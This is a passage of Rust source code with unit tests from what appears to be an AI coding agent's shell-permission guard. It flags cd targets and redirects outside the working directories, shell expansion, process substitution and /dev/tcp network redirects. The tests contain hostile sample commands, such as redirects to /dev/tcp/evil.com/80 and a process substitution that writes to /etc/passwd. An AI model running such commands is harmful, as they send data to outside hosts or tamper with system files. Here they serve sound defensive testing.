        //    We model the redirection case (handled in step 3) and the bare-cd
        //    target containment below; a separate non-redirection write command
        //    (`mv`/`cp`/`rm`) is the dangerous_removal guard's / a future batch's
        //    concern, so it is intentionally out of scope here.

        // 6. cd target outside the working dirs (`validateCommandPaths` →
        //    `validatePath` containment, `:677`, `ACTION_VERBS['cd'] = 'change
        //    directories to'`).
        let resolved = expand_cd_target(&cd_arg, roots);
        // TS `validatePath` pre-guards: a target with shell expansion / a `~`
        // variant asks with a custom reason. The bare `~` / `~/…` IS expanded
        // (by `expandTilde`) and validated; other tilde variants and `$`/`%`
        // targets ask. We fold those into the dangerous-expansion check (their
        // ask message differs, but the OUTCOME — an ask — is the same, and the
        // simple containment ask covers the common `cd /tmp` case the tests
        // exercise).
        if target_has_shell_expansion_cd(&cd_arg) {
            return Some(PathConstraintAsk {
                message: "Shell expansion syntax in paths requires manual approval".to_string(),
                reason: "Shell expansion syntax in paths requires manual approval".to_string(),
                blocked_path: Some(cd_arg.clone()),
                outside_reads_blocked: false,
            });
        }
        // `X6r` `..`-after-directory pre-guard for the cd target (claude-code
        // `Q6r`/validatePath, the `"read"` call site for cd). Same symlink-escape
        // defense as the redirect branch: `cd sub/../elsewhere` asks even though it
        // lexically collapses inside cwd (PATH-04 under-ask). Runs on the dequoted
        // RAW target before `expand_cd_target` collapses it.
        if crate::command_path_containment::dotdot_after_directory_segment(
            strip_surrounding_quotes(&cd_arg),
        ) {
            return Some(PathConstraintAsk {
                message: "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory".to_string(),
                reason: "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory".to_string(),
                blocked_path: Some(cd_arg.clone()),
                outside_reads_blocked: false,
            });
        }
        // PARITY 2.1.263 `ppo`: under the read block the cd target is checked
        // against `mEt` (which EXCLUDES projectSettings-sourced dirs), and the
        // refusal carries the read block's own copy plus the
        // `outsideReadsBlocked` safetyCheck instead of the generic containment
        // ask. `mEt ⊆ rb`, so once the block is armed this branch subsumes the
        // generic one below for `cd` — exactly as in the binary, where
        // `PE(target,…,"read")` reports `ov` before the generic path is reached.
        if let Some(block_dirs) = read_block_dirs {
            if !path_in_allowed_working_path(Path::new(&resolved), block_dirs, roots) {
                let resolved_disp = resolved.to_string_lossy();
                return Some(PathConstraintAsk {
                    message: "cd moves later reads to a directory outside the working directories, which the read block does not allow without asking (permissions.blockReadsOutsideWorkingDirectories). Add the directory with /add-dir, or remove that setting.".to_string(),
                    reason: crate::policy::OUTSIDE_READS_BLOCKED_REASON.to_string(),
                    blocked_path: Some(resolved_disp.into_owned()),
                    outside_reads_blocked: true,
                });
            }
        }
        if !path_in_allowed_working_path(Path::new(&resolved), &work_dirs, roots) {
            let dirs = all_working_directories(roots, additional);
            let dir_list = format_directory_list(&dirs);
            let resolved_disp = resolved.to_string_lossy();
            return Some(PathConstraintAsk {
                message: format!(
                    "cd in '{resolved_disp}' was blocked. For security, LingXi may only change directories to the allowed working directories for this session: {dir_list}."
                ),
                reason: format!(
                    "cd in '{resolved_disp}' was blocked. For security, LingXi may only change directories to the allowed working directories for this session: {dir_list}."
                ),
                blocked_path: Some(resolved_disp.into_owned()),
                outside_reads_blocked: false,
            });
        }
    }

    None
}

fn redirect_targets(command: &str, roots: &FsRoots, kind: RedirectKind) -> Vec<String> {
    let mut out = Vec::new();
    for sub in crate::shell_command::split_command(command) {
        for r in extract_redirections(&sub) {
            if r.kind != kind {
                continue;
            }
            // Dangerous (shell_expansion), braced (create-op brace guard),
            // /dev/null, and /dev/tcp|udp network targets never reach the
            // deny-rule walk — they ask via their own guards.
            if r.dangerous
                || r.brace
                || r.target == "/dev/null"
                || is_network_device_target(&r.target)
            {
                continue;
            }
            out.push(
                expand_redirect_target(&r.target, roots)
                    .to_string_lossy()
                    .into_owned(),
            );
        }
    }
    out
}

/// Resolve the SIMPLE output-redirect targets of `command` to absolute path
/// strings — the create/write targets that reach TS `validateOutputRedirections`
/// (`SPg`) and thus the Edit-deny-rule walk (`EUr`). Dangerous-expansion targets,
/// `/dev/null`, and `/dev/tcp`/`/dev/udp` network devices are EXCLUDED (they ask
/// via their own guards in [`check_path_constraints`], never reaching `SPg`).
///
/// Consumed by [`crate::policy`] to deny a redirect whose resolved target matches
/// an `Edit(...)` deny rule (`Output redirection to '<path>' was blocked by a deny
/// rule.`), before the working-dir containment ask.
#[must_use]
pub fn write_redirect_targets(command: &str, roots: &FsRoots) -> Vec<String> {
    redirect_targets(command, roots, RedirectKind::Output)
}

/// Resolve the SIMPLE input-redirect targets of `command` to absolute path
/// strings — the read targets that 2.1.232 routes through the same deny/working-
/// dir gate as positional read arguments. Dangerous-expansion targets,
/// `/dev/null`, and `/dev/tcp`/`/dev/udp` network devices are EXCLUDED (they ask
/// via their own guards in [`check_path_constraints`], never reaching the
/// `Read(...)` deny walk).
#[must_use]
pub fn read_redirect_targets(command: &str, roots: &FsRoots) -> Vec<String> {
    redirect_targets(command, roots, RedirectKind::Input)
}

/// Shell-expansion pre-guard for a `cd` target — TS `validatePath`'s `$`/`%`/`=`
/// and tilde-variant checks (`pathValidation.ts:401-436`). A bare `~`/`~/…` is
/// NOT flagged here (it is expanded and containment-checked); a tilde VARIANT
/// (`~user`, `~+`, …) or any `$`/`` ` ``/`%`/`=`-bearing target IS.
fn target_has_shell_expansion_cd(target: &str) -> bool {
    let t = strip_surrounding_quotes(target);
    // `~` / `~/…` are expandable → not flagged. Other `~…` variants are.
    if t.starts_with('~') && t != "~" && !t.starts_with("~/") {
        return true;
    }
    t.contains('$') || t.contains('%') || t.contains('`') || t.starts_with('=')
}

/// Lexically resolve a redirect target to an absolute path for containment.
/// Strips surrounding quotes, then reuses [`crate::filesystem`]'s expansion (a
/// simple target has no shell expansion left after the dangerous-expansion
/// filter, so this is a plain tilde/cwd join + normalize).
fn expand_redirect_target(target: &str, roots: &FsRoots) -> PathBuf {
    let clean = strip_surrounding_quotes(target);
    crate::filesystem::expand_path(clean, roots)
}

/// Lexically resolve a `cd` target to an absolute path for containment (same
/// expansion as a redirect target).
fn expand_cd_target(target: &str, roots: &FsRoots) -> PathBuf {
    let clean = strip_surrounding_quotes(target);
    crate::filesystem::expand_path(clean, roots)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn roots() -> FsRoots {
        FsRoots {
            cwd: PathBuf::from("/proj/work"),
            home: Some(PathBuf::from("/home/u")),
            lingxi_home: PathBuf::from("/home/u/.lingxi"),
        }
    }

    fn check(cmd: &str) -> Option<PathConstraintAsk> {
        check_path_constraints(cmd, &roots(), &[], None)
    }

    // ── PATH-04: `..`-after-directory traversal on redirect/cd targets asks ──
    #[test]
    fn redirect_target_dotdot_after_dir_asks_even_when_contained() {
        // `sub/../out.txt` collapses back inside cwd, but the `..` after a real
        // directory segment may follow a symlink out — CC asks (X6r pre-guard).
        let a = check("echo x > sub/../out.txt").expect("must ask");
        assert_eq!(
            a.message,
            "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory"
        );
        assert_eq!(a.reason, a.message);
        // A leading `../out.txt` (no real segment before `..`) does NOT trip this
        // guard — it falls through to the ordinary containment check.
        assert!(
            check("echo x > out.txt").is_none(),
            "plain in-cwd write is fine"
        );
    }

    #[test]
    fn cd_target_dotdot_after_dir_asks_even_when_contained() {
        let a = check("cd sub/../other && ls").expect("must ask");
        assert_eq!(
            a.message,
            "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory"
        );
    }

    // ── redirection outside cwd → ask ──────────────────────────────────────

    #[test]
    fn redirect_outside_cwd_asks() {
        let a = check("echo x > /etc/foo").expect("should ask");
        assert_eq!(
            a.message,
            "Output redirection to '/etc/foo' was blocked. For security, \
             LingXi may only write to files in the allowed working \
             directories for this session: '/proj/work'."
        );
        assert_eq!(a.reason, a.message);
    }

    #[test]
    fn append_redirect_outside_cwd_asks() {
        let a = check("echo x >> /var/log/out").expect("should ask");
        assert!(a
            .message
            .starts_with("Output redirection to '/var/log/out' was blocked."));
    }

    #[test]
    fn input_redirect_outside_cwd_asks() {
        let a = check("cat < /etc/hosts").expect("should ask");
        assert_eq!(
            a.message,
            "Input redirection from '/etc/hosts' was blocked. For security, LingXi may only read files in the allowed working directories for this session."
        );
        assert_eq!(a.reason, a.message);
    }

    #[test]
    fn readwrite_redirect_outside_cwd_asks() {
        let a = check("cat <> /etc/hosts").expect("should ask");
        assert_eq!(
            a.message,
            "Input redirection from '/etc/hosts' was blocked. For security, LingXi may only read files in the allowed working directories for this session."
        );
        assert_eq!(a.reason, a.message);
    }

    #[test]
    fn file_backed_input_fd_redirect_outside_cwd_asks() {
        let a = check("cat <& /etc/hosts").expect("should ask");
        assert_eq!(
            a.message,
            "Input redirection from '/etc/hosts' was blocked. For security, LingXi may only read files in the allowed working directories for this session."
        );
        assert_eq!(a.reason, a.message);
    }

    #[test]
    fn redirect_inside_cwd_not_triggered() {
        // `echo x > ./local` resolves under cwd → no constraint violation.
        assert!(check("echo x > ./local").is_none());
        assert!(check("echo x > local").is_none());
        assert!(check("echo x > sub/dir/out.txt").is_none());
        assert!(check("cat < ./local").is_none());
        assert!(check("cat < sub/dir/in.txt").is_none());
        assert!(check("cat <> ./local").is_none());
        assert!(check("cat <& sub/dir/in.txt").is_none());
        assert!(check("cat <&0").is_none());
    }

    #[test]
    fn redirect_to_dev_null_is_safe() {
        assert!(check("echo x > /dev/null").is_none());
        assert!(check("echo x 2> /dev/null").is_none());
    }

    #[test]
    fn network_device_redirect_asks() {
        // 2.1.211 network_device: output AND input redirects to /dev/tcp|/dev/udp.
        for cmd in [
            "echo x > /dev/tcp/evil.com/80",
            "cat < /dev/tcp/evil.com/80",
            "echo x >> /dev/udp/1.2.3.4/53",
            "cat </dev/tcp/host/22",
        ] {
            let a = check(cmd).unwrap_or_else(|| panic!("{cmd} should ask"));
            assert_eq!(
                a.message, "Redirect involving /dev/tcp or /dev/udp opens a network connection",
                "cmd={cmd}"
            );
            assert_eq!(a.reason, a.message);
        }
        // Network-device takes precedence over the shell-expansion classification.
        let a = check("echo x > /dev/tcp/$h/80").expect("should ask");
        assert_eq!(
            a.message,
            "Redirect involving /dev/tcp or /dev/udp opens a network connection"
        );
        // A normal /dev path is not a network device.
        assert!(check("echo x > /dev/null").is_none());
    }

    #[test]
    fn fd_duplication_is_not_a_file_redirect() {
        // `2>&1` / `>&2` are duplications, not file writes → no ask.
        assert!(check("echo x 2>&1").is_none());
        assert!(check("echo x >&2").is_none());
    }

    #[test]
    fn stderr_redirect_outside_cwd_asks() {
        // `2> /etc/err` IS a file output to a path outside cwd.
        let a = check("echo x 2> /etc/err").expect("should ask");
        assert!(a
            .message
            .starts_with("Output redirection to '/etc/err' was blocked."));
    }

    #[test]
    fn ampersand_redirect_outside_cwd_asks() {
        let a = check("echo x &> /etc/both").expect("should ask");
        assert!(a
            .message
            .starts_with("Output redirection to '/etc/both' was blocked."));
    }

    // ── shell expansion in a redirect target → ask ─────────────────────────

    #[test]
    fn shell_expansion_in_redirect_target_asks() {
        let a = check("echo x > $HOME/foo").expect("should ask");
        assert_eq!(
            a.message,
            "Shell expansion syntax in paths requires manual approval"
        );
        assert_eq!(
            a.reason,
            "Shell expansion syntax in paths requires manual approval"
        );
    }

    #[test]
    fn tilde_redirect_target_asks() {
        // `~` prefixed targets are flagged dangerous by hasDangerousExpansion.
        let a = check("echo x > ~/secret").expect("should ask");
        assert_eq!(
            a.message,
            "Shell expansion syntax in paths requires manual approval"
        );
        let b = check("cat < ~/secret").expect("should ask");
        assert_eq!(
            b.message,
            "Shell expansion syntax in paths requires manual approval"
        );
    }

    #[test]
    fn read_redirect_targets_only_include_simple_reads() {
        assert_eq!(
            read_redirect_targets("cat < secrets/in.txt < /dev/null < \"$HOME/x\"", &roots()),
            vec!["/proj/work/secrets/in.txt".to_string()]
        );
    }

    #[test]
    fn read_redirect_targets_include_readwrite_and_file_backed_fd_forms() {
        assert_eq!(
            read_redirect_targets("cat <> secrets/rw.txt <& secrets/fd.txt <&0 <&-", &roots()),
            vec![
                "/proj/work/secrets/rw.txt".to_string(),
                "/proj/work/secrets/fd.txt".to_string(),
            ]
        );
    }

    #[test]
    fn glob_redirect_target_asks() {
        let a = check("echo x > *.sh").expect("should ask");
        assert_eq!(
            a.message,
            "Shell expansion syntax in paths requires manual approval"
        );
    }

    // ── redirect-target danger classification drift (PERM-PATH-07) ─────────

    #[test]
    fn percent_redirect_target_is_not_dangerous() {
        // `%` is Windows-gated in EUr, not flagged by eLe → a `file%1` target
        // in cwd containment-passes (the port previously over-asked on `%`).
        assert!(check("echo x > file%1").is_none());
        assert!(check("echo x > out%.log").is_none());
    }

    #[test]
    fn brace_redirect_target_gets_brace_message() {
        // A braced write target flows to EUr's create-op brace guard, NOT the
        // shell-expansion ask.
        let a = check("echo x > {a,b}.txt").expect("should ask");
        assert_eq!(
            a.message,
            "Brace characters in write target require manual approval \u{2014} bash may brace-expand to paths outside the working directory"
        );
        assert_eq!(a.reason, a.message);
    }

    #[test]
    fn brace_redirect_message_precedes_containment() {
        // Even an out-of-cwd braced target gets the brace message (brace guard
        // runs before the working-dir containment check in EUr).
        let a = check("echo x > /etc/{a,b}").expect("should ask");
        assert!(a
            .message
            .starts_with("Brace characters in write target require manual approval"));
    }

    #[test]
    fn ampersand_fd_redirect_charset_asks() {
        // `>&` target with a non-[A-Za-z0-9./_-] char → eLe charset gate →
        // shell-expansion ask.
        let a = check("echo x >& out+log").expect("should ask");
        assert_eq!(
            a.message,
            "Shell expansion syntax in paths requires manual approval"
        );
        // A charset-clean `>&file` under cwd is a plain file redirect → no ask.
        assert!(check("echo x >& out.log").is_none());
    }

    // ── process substitution → ask ─────────────────────────────────────────

    #[test]
    fn process_substitution_output_asks() {
        let a = check("echo secret > >(tee /etc/passwd)").expect("should ask");
        assert_eq!(
            a.message,
            "Process substitution (>(...) or <(...)) can execute arbitrary commands and requires manual approval"
        );
        assert_eq!(a.reason, "Process substitution requires manual approval");
    }

    #[test]
    fn process_substitution_input_asks() {
        let a = check("diff <(sort a) <(sort b)").expect("should ask");
        assert_eq!(a.reason, "Process substitution requires manual approval");
    }

    #[test]
    fn process_substitution_takes_priority_over_redirect_containment() {
        // The proc-subst guard runs first (TS order), so the message is the
        // proc-subst one even though there is also a redirect.
        let a = check("cat x > >(tee out)").expect("should ask");
        assert_eq!(a.reason, "Process substitution requires manual approval");
    }

    // ── cd outside cwd → ask ───────────────────────────────────────────────

    #[test]
    fn cd_outside_cwd_asks() {
        let a = check("cd /tmp").expect("should ask");
        assert_eq!(
            a.message,
            "cd in '/tmp' was blocked. For security, LingXi may only \
             change directories to the allowed working directories for this \
             session: '/proj/work'."
        );
    }

    #[test]
    fn cd_outside_then_command_asks() {
        // `cd /tmp && ...` — the cd target is outside cwd → ask. (No redirection,
        // so step 3's cd+redirection guard doesn't fire; step 6 catches the cd.)
        let a = check("cd /tmp && ls").expect("should ask");
        assert!(a.message.starts_with("cd in '/tmp' was blocked."));
    }

    #[test]
    fn cd_inside_cwd_not_triggered() {
        assert!(check("cd ./sub").is_none());
        assert!(check("cd sub/dir").is_none());
        // bare `cd` → home dir, treated as benign (no positional target).
        assert!(check("cd").is_none());
        assert!(check("cd -P sub").is_none());
    }

    // ── cd multi-positional (zsh `cd OLD NEW`) → ask (PERM-PATH-03) ─────────

    #[test]
    fn cd_multi_positional_asks() {
        // Two positional dir args = zsh `cd OLD NEW` substitution form → ask,
        // even when both resolve under cwd (where the join-all port silently
        // passed).
        for cmd in ["cd sub other", "cd a b c", "cd ./x ./y", "cd -- a b"] {
            let a = check(cmd).unwrap_or_else(|| panic!("{cmd} should ask"));
            assert_eq!(
                a.message,
                "cd with two or more directory arguments requires manual approval. \
                 zsh's \"cd OLD NEW\" form substitutes OLD\u{2192}NEW in $PWD, producing \
                 a target path that cannot be statically validated.",
                "cmd={cmd}"
            );
            assert_eq!(
                a.reason, "cd with two or more directory arguments",
                "cmd={cmd}"
            );
        }
    }

    #[test]
    fn cd_single_positional_with_flags_not_multi() {
        // Flags before the first positional don't count; a single positional is
        // validated normally (here inside cwd → no ask).
        assert!(check("cd -P sub").is_none());
        assert!(check("cd -L -P ./sub").is_none());
        // A bare `-` is a single positional (OLDPWD), resolves under cwd lexically.
        assert!(check("cd -").is_none());
    }

    #[test]
    fn cd_multi_positional_flag_after_positional_counts() {
        // Once the first positional is seen, later flags also count → ≥2 → ask.
        let a = check("cd sub -P").expect("should ask");
        assert_eq!(a.reason, "cd with two or more directory arguments");
    }

    #[test]
    fn cd_single_positional_first_only_validated() {
        // Single positional outside cwd still asks via containment (first
        // positional only, no join artifacts).
        let a = check("cd /tmp").expect("should ask");
        assert!(a.message.starts_with("cd in '/tmp' was blocked."));
    }

    #[test]
    fn cd_with_redirection_compound_asks() {
        // `cd .lingxi/ && echo x > settings.json` — cd + redirection compound.
        // The cd target (./.claude under cwd) is INSIDE cwd, so step 6 wouldn't
        // fire; the cd+redirection guard (step 3) is what asks.
        let a = check("cd ./.claude && echo x > settings.json").expect("should ask");
        assert_eq!(
            a.reason,
            "Compound command contains cd with output redirection - manual approval required to prevent path resolution bypass"
        );
    }

    // ── cd-compound + /dev/null-only redirect is exempt (PERM-PATH-08) ─────

    #[test]
    fn cd_compound_dev_null_only_redirect_not_asked() {
        // `SPg` only raises the cd-compound-redirect ask for a target OTHER than
        // /dev/null; a /dev/null-only redirect set falls through to cd/target
        // validation (cd target under cwd → no ask).
        assert!(check("cd sub && echo x > /dev/null 2>&1").is_none());
        assert!(check("cd ./sub && cmd > /dev/null").is_none());
        assert!(check("cd sub && cmd 2> /dev/null").is_none());
    }

    #[test]
    fn cd_compound_non_dev_null_redirect_still_asks() {
        // A real (non-/dev/null) redirect target in a cd-compound still asks.
        let a = check("cd sub && echo x > out.txt").expect("should ask");
        assert_eq!(
            a.reason,
            "Compound command contains cd with output redirection - manual approval required to prevent path resolution bypass"
        );
        // Mixed /dev/null + real target → still asks (some target != /dev/null).
        let a = check("cd sub && echo x > /dev/null > out.txt").expect("should ask");
        assert!(a
            .message
            .starts_with("Commands that change directories and write via output redirection"));
    }

    // ── command fully inside cwd → no constraint (rides allow rule) ─────────

    #[test]
    fn command_fully_inside_cwd_passes() {
        assert!(check("echo hello").is_none());
        assert!(check("npm install").is_none());
        assert!(check("echo x > out.txt && cat out.txt").is_none());
        assert!(check("cd ./src && cargo build").is_none());
    }

    // ── additional working dirs widen the allowance ────────────────────────

    #[test]
    fn redirect_into_additional_working_dir_passes() {
        let extra = vec![PathBuf::from("/tmp/scratch")];
        assert!(
            check_path_constraints("echo x > /tmp/scratch/out", &roots(), &extra, None).is_none()
        );
        // Outside both cwd and the extra dir → still asks, and the dir list
        // includes both.
        let a = check_path_constraints("echo x > /etc/foo", &roots(), &extra, None).expect("ask");
        assert!(a.message.contains("'/proj/work', '/tmp/scratch'"));
    }

    #[test]
    fn cd_into_additional_working_dir_passes() {
        let extra = vec![PathBuf::from("/tmp/scratch")];
        assert!(check_path_constraints("cd /tmp/scratch", &roots(), &extra, None).is_none());
    }

    // ── format_directory_list parity ───────────────────────────────────────

    #[test]
    fn format_directory_list_truncates_past_max() {
        let dirs: Vec<String> = (0..7).map(|i| format!("/d{i}")).collect();
        let s = format_directory_list(&dirs);
        assert_eq!(s, "'/d0', '/d1', '/d2', '/d3', '/d4', and 2 more");
    }

    #[test]
    fn format_directory_list_lists_all_when_within_max() {
        let dirs = vec!["/a".to_string(), "/b".to_string()];
        assert_eq!(format_directory_list(&dirs), "'/a', '/b'");
    }

    // ── quoted redirect target ─────────────────────────────────────────────

    #[test]
    fn quoted_redirect_target_outside_cwd_asks() {
        let a = check("echo x > \"/etc/foo\"").expect("should ask");
        assert!(a
            .message
            .starts_with("Output redirection to '/etc/foo' was blocked."));
    }

    #[test]
    fn process_substitution_detection_variants() {
        assert!(has_process_substitution("echo > >(cmd)"));
        assert!(has_process_substitution("echo >>(cmd)"));
        assert!(has_process_substitution("diff <(a) <(b)"));
        assert!(has_process_substitution("cat <( sort x )"));
        assert!(!has_process_substitution("echo x > out"));
        assert!(!has_process_substitution("echo (literal)"));
    }
}
